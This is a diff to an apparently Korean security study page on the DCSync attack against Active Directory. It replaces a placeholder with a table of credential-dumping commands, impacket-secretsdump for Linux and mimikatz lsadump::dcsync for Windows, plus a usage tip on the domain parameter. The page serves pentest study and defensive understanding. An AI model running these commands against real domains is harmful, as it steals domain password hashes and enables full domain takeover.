@@ -40,7 +40,14 @@ AD 환경에서 여러 개의 DC가 존재하는 경우, 모든 DC의 데이터�
 5. Using Hash (해시 사용): 공격자는 해시를 이용하여 `PtH (Pass the Hash)` 나 `Golden Ticket` 같은 다른 공격을 시도할 수 있습니다.
 
 ## Attack Methods (공격 방법)
-추후 수정 예정
+
+| Linux                                     | Windows               |
+|:------------------------------------------|:----------------------|
+| `impacket-secretsdump <domain>\<user>@<ip>`|`mimikatz # lsadump::dcsync /domain:<domain> /user:<domain>\user`|
+| `impacket-secretsdump -just-dc <user>:"<password>"@<ip>` | `Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<domain> /user:<domain>\<user>`|
+
+{: .warning }
+> `/user:` 란에 `domain.com`이 아닌 `domain`을 써야될때가 있습니다.
 
 ## References
 
